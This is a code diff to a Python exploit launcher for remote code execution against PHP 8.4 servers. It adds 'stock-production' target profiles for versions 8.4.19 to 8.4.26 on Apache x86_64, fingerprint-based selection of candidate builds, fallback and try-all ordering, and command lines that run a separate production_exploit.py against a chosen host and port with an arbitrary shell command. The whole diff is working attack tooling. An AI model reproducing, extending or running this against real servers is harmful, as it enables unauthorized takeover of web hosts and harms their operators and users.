@@ -28,6 +28,7 @@ from pathlib import Path
 from typing import Any
 
 from profile_db import (
+    ROOT,
     list_profiles,
     load_profile,
     match_profiles,
@@ -37,6 +38,7 @@ from profile_db import (
     profile_requirements_ok,
     recommended_huge_mb,
 )
+from production_exploit import VERSION_OFFSETS
 from fpm_db import (
     command as fpm_command,
     format_matches as format_fpm_matches,
@@ -398,6 +400,112 @@ def _candidate_rows(matches: list[dict[str, Any]]) -> list[str]:
     return rows
 
 
+def _ver_tuple(version: str | None) -> tuple[int, ...]:
+    if not version:
+        return ()
+    try:
+        return tuple(int(part) for part in version.split("."))
+    except ValueError:
+        return ()
+
+
+def _production_profile(version: str) -> dict[str, Any]:
+    return {
+        "name": f"php-{version}-prod-x86_64",
+        "php_version": version,
+        "branch": "8.4",
+        "arch": "x86_64",
+        "distro": "debian",
+        "sapi": "apache2handler",
+        "sapi_hint": "apache",
+        "rce": True,
+        "verified": True,
+        "chain": "production",
+        "production": {"version": version},
+        "config": {
+            "memory_limit": 134217728,
+            "post_max_size": 8388608,
+            "display_errors": "Off",
+            "output_buffering": 4096,
+        },
+        "status": "stock php.ini-production; production_exploit.py",
+    }
+
+
+def production_candidates(fingerprint: dict[str, Any],
+                          arch: str | None = None) -> list[dict[str, Any]]:
+    """Return stock-production 8.4 profiles in exact-build priority order.
+
+    These profiles intentionally do not use the session-chain profile schema:
+    production_exploit.py is a separate chain and is run with --version.
+    """
+    fp = fingerprint
+    target_php = fp.get("php_version")
+    target_ver = _ver_tuple(target_php)
+    target_arch = normalize_arch(arch or fp.get("arch"))
+    if target_arch and target_arch != "x86_64":
+        return []
+    if fp.get("sapi") in ("fpm-fcgi", "cli-server"):
+        return []
+    if (fp.get("sapi_hint") or "").lower() in (
+            "nginx", "litespeed", "iis", "cli-server"):
+        return []
+    if fp.get("session_upload_progress") is False:
+        return []
+
+    available = sorted(VERSION_OFFSETS, key=_ver_tuple)
+    if target_php:
+        if (len(target_ver) < 3 or target_ver[:2] != (8, 4) or
+                target_ver < (8, 4, 19) or target_ver > (8, 4, 26)):
+            return []
+        ordered = [target_php] + [
+            v for v in sorted(
+                (v for v in available if v != target_php),
+                key=lambda v: (abs(_ver_tuple(v)[2] - target_ver[2]), v))
+        ]
+    else:
+        ordered = list(reversed(available))
+    return [_production_profile(v) for v in ordered]
+
+
+def production_command(profile: dict[str, Any], url: str,
+                       args: argparse.Namespace,
+                       workers: int) -> list[str]:
+    parts = urllib.parse.urlsplit(url)
+    host = parts.hostname or "127.0.0.1"
+    scheme = parts.scheme.lower()
+    port = parts.port or (443 if scheme == "https" else 80)
+    cmd = args.cmd
+    if cmd == "id>/tmp/p2s-proof":
+        cmd = "id>/out/p1"
+    argv = [
+        sys.executable,
+        str(ROOT / "production_exploit.py"),
+        "--host", host,
+        "--port", str(port),
+        "--workers", str(workers),
+        "--version", profile["php_version"],
+        "--arch", "x86_64",
+        "--cmd", cmd,
+        "--host-proof", args.proof_file,
+        "--timeout", str(max(60.0, args.timeout)),
+    ]
+    if scheme == "https":
+        argv += ["--https", "--servername", host]
+        if args.insecure:
+            argv.append("--insecure")
+    return argv
+
+
+def _production_rows(candidates: list[dict[str, Any]]) -> list[str]:
+    rows = []
+    for candidate in candidates:
+        rows.append(
+            f"{candidate['name']:<40} stock-production RCE "
+            f"{candidate['php_version']}")
+    return rows
+
+
 def _choose_profile(args, matches: list[dict[str, Any]]) -> dict[str, Any]:
     if args.profile:
         chosen = load_profile(args.profile)
@@ -449,6 +557,9 @@ def main() -> int:
                     help="persistent chain: local CLI server PID for base lookup")
     ap.add_argument("--workers", type=int, default=None,
                     help="known prefork worker count")
+    ap.add_argument("--production-workers", type=int, default=None,
+                    help="workers for the stock-production chain "
+                         "(defaults to --workers, else 1)")
     ap.add_argument("--memory-limit-mb", type=int, default=None,
                     help="known memory_limit; avoids the OOM probe")
     ap.add_argument("--active", action="store_true",
@@ -481,6 +592,10 @@ def main() -> int:
     args = ap.parse_args()
 
     if args.list_profiles:
+        for version in sorted(VERSION_OFFSETS, key=_ver_tuple):
+            p = _production_profile(version)
+            print(f"{p['name']:<42} {p['php_version']:<9} "
+                  f"{p['arch']:<8} RCE stock-production")
         for p in list_profiles():
             flags = "RCE" if p.get("rce") else "-"
             print(f"{p['name']:<42} {p.get('php_version','?'):<9} "
@@ -542,6 +657,9 @@ def main() -> int:
             fp["memory_limit"] = fp["memory_probe"]["limit_bytes"]
 
     matches = match_profiles(fp, arch=arch, limit=args.limit)
+    prod_candidates = ([] if persistent else
+                       production_candidates(fp, arch))
+    prod_workers = (args.production_workers or args.workers or 1)
     if args.profile:
         forced = load_profile(args.profile)
         # Keep the forced profile first for display, but preserve match metadata
@@ -558,6 +676,7 @@ def main() -> int:
         print(json.dumps({
             "fingerprint": fp,
             "matches": matches,
+            "production_matches": prod_candidates,
             "fpm_matches": fpm_matches if persistent else [],
         }, indent=2))
     else:
@@ -581,7 +700,12 @@ def main() -> int:
             for row in format_fpm_matches(fpm_matches):
                 print("  " + row)
         else:
-            print("[*] profile matches:")
+            if prod_candidates:
+                print(f"[*] stock-production profile matches "
+                      f"(workers={prod_workers}):")
+                for row in _production_rows(prod_candidates):
+                    print("  " + row)
+            print("[*] session-chain profile matches:")
             for row in _candidate_rows(matches):
                 print("  " + row)
 
@@ -647,15 +771,23 @@ def main() -> int:
     if args.run:
         if args.profile:
             try:
-                candidates = [load_profile(args.profile)]
-                ok, problems = profile_requirements_ok(candidates[0])
+                chosen = load_profile(args.profile)
+                ok, problems = profile_requirements_ok(chosen)
                 if not ok:
                     raise ValueError("; ".join(problems))
+                candidates = [dict(chosen, chain="session")]
             except (ValueError, SystemExit) as exc:
                 print(f"[-] profile: {exc}", file=sys.stderr)
                 return 1
         elif args.fallback or args.try_all:
-            candidates = priority_candidates(fp, arch=arch)
+            session_candidates = [
+                dict(candidate, chain="session")
+                for candidate in priority_candidates(fp, arch=arch)
+            ]
+            candidates = [
+                dict(candidate, chain="production")
+                for candidate in prod_candidates
+            ] + session_candidates
             if args.try_all:
                 cap = len(candidates)
             else:
@@ -668,22 +800,45 @@ def main() -> int:
                 return 1
             print("[*] fallback priority:")
             for i, candidate in enumerate(candidates, 1):
-                print(f"  {i}. {candidate['name']} ({candidate['php_version']}/"
-                      f"{candidate['arch']})")
+                if candidate.get("chain") == "production":
+                    print(f"  {i}. {candidate['name']} "
+                          f"({candidate['php_version']}/x86_64, "
+                          f"stock-production)")
+                else:
+                    print(f"  {i}. {candidate['name']} "
+                          f"({candidate['php_version']}/"
+                          f"{candidate['arch']}, session-chain)")
         else:
-            try:
-                chosen = _choose_profile(args, matches)
-            except SystemExit as exc:
-                print(f"[-] {exc}", file=sys.stderr)
-                return 1
-            candidates = [chosen]
+            if prod_candidates:
+                candidates = [dict(prod_candidates[0], chain="production")]
+            else:
+                try:
+                    chosen = _choose_profile(args, matches)
+                except SystemExit as exc:
+                    print(f"[-] {exc}", file=sys.stderr)
+                    return 1
+                candidates = [dict(chosen, chain="session")]
+
+        if (prod_candidates and args.workers is None and
+                args.production_workers is None and
+                any(c.get("chain") == "production" for c in candidates)):
+            print(f"[*] production worker count defaults to {prod_workers}; "
+                  f"pass --workers or --production-workers for a different pool",
+                  flush=True)
 
         for index, chosen in enumerate(candidates, 1):
-            huge = recommended_huge_mb(chosen, fp.get("memory_limit"))
-            command = profile_command(chosen, args.url, args.cmd,
-                                      args.proof_file, huge_mb=huge)
-            print(f"[*] attempt {index}/{len(candidates)}: {chosen['name']} "
-                  f"(huge_mb={huge})", flush=True)
+            if chosen.get("chain") == "production":
+                command = production_command(
+                    chosen, args.url, args, prod_workers)
+                print(f"[*] attempt {index}/{len(candidates)}: "
+                      f"{chosen['name']} (stock-production, "
+                      f"workers={prod_workers})", flush=True)
+            else:
+                huge = recommended_huge_mb(chosen, fp.get("memory_limit"))
+                command = profile_command(chosen, args.url, args.cmd,
+                                          args.proof_file, huge_mb=huge)
+                print(f"[*] attempt {index}/{len(candidates)}: "
+                      f"{chosen['name']} (huge_mb={huge})", flush=True)
             print("[*] running:", " ".join(command), flush=True)
             try:
                 Path(args.proof_file).unlink()
@@ -701,6 +856,7 @@ def main() -> int:
             print(f"[-] attempt {index} exited {rc}; no proof at "
                   f"{args.proof_file}", file=sys.stderr)
         return 1
+
     return 0
 
 
